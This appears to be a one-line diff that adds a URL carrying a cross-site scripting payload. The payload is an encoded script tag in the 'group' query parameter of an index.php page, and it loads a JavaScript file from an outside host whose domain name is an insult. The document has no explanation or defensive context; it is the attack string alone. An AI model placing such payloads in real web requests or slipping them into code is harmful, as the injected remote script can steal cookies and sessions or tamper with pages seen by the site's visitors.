@@ -1,0 +1,1 @@
+http://www.example.com/index.php?group=&lt;script src=http://www.youfucktard.com/xss.js&gt;&lt;/script&gt;
